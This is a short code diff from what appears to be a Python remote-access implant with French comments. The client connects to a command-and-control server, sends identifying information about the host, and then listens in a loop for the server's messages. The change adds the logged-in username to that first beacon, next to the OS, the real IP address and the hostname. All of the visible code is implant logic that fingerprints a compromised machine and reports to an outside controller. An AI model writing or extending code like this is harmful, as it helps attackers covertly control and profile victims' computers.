@@ -182,13 +182,14 @@ def main():
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                 sock.connect((SERVER_HOST, SERVER_PORT))
-                
+                username = os.getenv("USERNAME") or os.getenv("USER") or "?"
                 # le client envoit les premieres infos
                 send_msg(sock, {
                     "type": "client connecté",
                     "os": os_type,
                     "ip": get_real_ip(),
-                    "hostname": platform.node()
+                    "hostname": platform.node(),
+                    "user": username
                 })
 
                 # ecoute en boucle des messages envoyés par C2
